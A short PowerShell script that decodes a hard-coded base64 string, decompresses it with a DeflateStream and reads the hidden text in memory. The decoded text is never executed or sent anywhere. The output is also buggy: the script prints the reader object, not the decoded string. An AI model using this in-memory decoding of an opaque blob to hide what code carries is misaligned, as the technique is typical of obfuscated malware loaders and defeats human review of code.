$compressedString = "FchbCsAgDAXRrWQF2VN8XzAajLTS1bf9GTiTxFuYshJBK905SMeTFx1RMxKzjigbczi3rZ0C9hAFR3eKcxRUtmZU5MJH/kIYKZ//vg=="
$ms = New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String($compressedString))
$ds = New-Object System.IO.Compression.DeflateStream($ms,[System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($ds)
$sr.ReadToEnd()
Write-Output $sr
